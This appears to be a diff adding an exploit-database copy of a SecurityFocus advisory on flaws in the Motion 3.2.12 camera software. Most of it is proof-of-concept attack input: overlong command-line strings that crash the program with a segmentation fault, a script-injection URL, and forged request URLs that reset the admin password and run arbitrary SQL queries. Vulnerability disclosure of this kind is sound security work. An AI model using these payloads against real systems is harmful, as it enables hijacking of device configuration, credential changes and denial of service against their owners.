@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/60818/info
+
+Motion is prone to multiple security vulnerabilities including multiple buffer-overflow vulnerabilities, a cross-site scripting vulnerability and a cross-site request-forgery vulnerability.
+
+An attacker may exploit these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, perform unauthorized actions, execute arbitrary code, and cause denial-of-service conditions. Other attacks may also be possible.
+
+Motion 3.2.12 is vulnerable; other versions may also be affected. 
+
+Buffer-overflow:
+
+# motion -c `python -c 'print "\x41"*1000'`
+[0] Configfile
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAA
+not fou:
+Segmentation fault
+
+
+# motion -p /tmp/`python -c 'print "\x41"*5000'`
+Segmentation fault
+
+Cross-site scripting:
+
+http://www.example.com
+<IP>:<PORT>/0/config/set?process_id_file=</li><script>alert('XSS');</script><li>
+
+Cross-site request forgery:
+
+http://www.example.com/0/config/set?control_authentication=admin:mypassword
+(Set admin password)
+http://www.example.com/0/config/set?sql_query=SELECT%20user() (Arbitrary 
+SQL
+query)
